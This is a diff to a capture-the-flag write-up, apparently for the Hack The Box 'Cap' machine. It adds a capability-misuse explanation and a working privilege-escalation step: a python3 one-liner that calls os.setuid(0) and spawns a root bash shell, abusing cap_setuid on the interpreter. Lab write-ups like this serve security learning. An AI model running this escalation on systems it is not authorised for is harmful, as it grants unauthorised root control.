@@ -194,6 +194,8 @@ The user flag can also be found in the SSH server.
 
 ### Enumeration
 
+Nathan has the cap_setuid capability on python
+
 ```
 nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
@@ -204,18 +206,18 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 
 ```
 
+Identifies instances where a process (granted CAP_SETUID and/or CAP_SETGID capabilities) is executed, after which the user’s access is elevated to UID/GID 0 (root). In Linux, the CAP_SETUID and CAP_SETGID capabilities allow a process to change its UID and GID, respectively, providing control over user and group identity management. Attackers may leverage a misconfiguration for exploitation in order to escalate their privileges to root.
+
 ### Exploitation
 
 Step-by-step privilege escalation.
 
 ```shell
-# Commands used
-```
+nathan@cap:~$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+root@cap:~# file /root/root.txt
+/root/root.txt: ASCII text
+root@cap:~# 
 
-### Root Flag
-
-```
-root.txt: ********************************
 ```
 
 ---
